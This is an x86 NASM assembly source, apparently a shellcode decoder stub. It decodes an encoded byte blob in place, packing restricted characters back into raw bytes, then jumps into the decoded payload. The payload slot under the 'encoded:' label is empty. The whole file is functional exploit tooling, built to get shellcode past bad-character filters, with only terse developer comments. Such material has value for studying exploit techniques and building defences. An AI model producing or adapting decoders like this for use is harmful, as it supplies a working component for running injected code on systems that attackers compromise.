;nasm -f bin .\new_origin.asm -o decoder_ing.bin
;ndisasm -b32 .\origin.asm
BITS 32 ;
section .text
global _start
_start:
setup: ;
    xchg esi, eax
    xor eax,eax
    mov ah, 0x39
    mov bl,0xbf
    mov cl,0xff        ;
;xor_patcher:        len_0 = 26*3 = 0x4e, len = 0x4e+0x03;  bl = 0xbf, ah = 0x39, cl = 0xff, al = 0x00
    ;add esi, 0x21
looper_setup:
    add esi, 0x7f
    add esi, 0x31
    mov edi,esi
looper:
    cmp [esi], ah
    je end
    mov cl,0x06
    cmp BYTE [esi], 0x59
    jg subtract
        dec ecx
        cmp [esi], ah
        jg subtract;
            sub byte [esi], 0x30
            jmp get_next
subtract:
        sub byte [esi], 0x3b

get_next:
        ;clc;Do i require this needs to be checked.
        adc al, cl
        SHL ebx, cl
        xor bl, [esi]
        inc esi
    outbits:
        cmp al, 0x08
        jb outbitdown
        sub al, 0x08
        push ebx
        mov ecx,eax
        SHR ebx, cl
        mov [edi], bl
        pop ebx
        inc edi
        cmp ah, [esi] 
        jne outbits
    outbitdown:
        cmp ah, [esi] 
        jne looper
end:
popa
jmp SHORT $+79
encoded: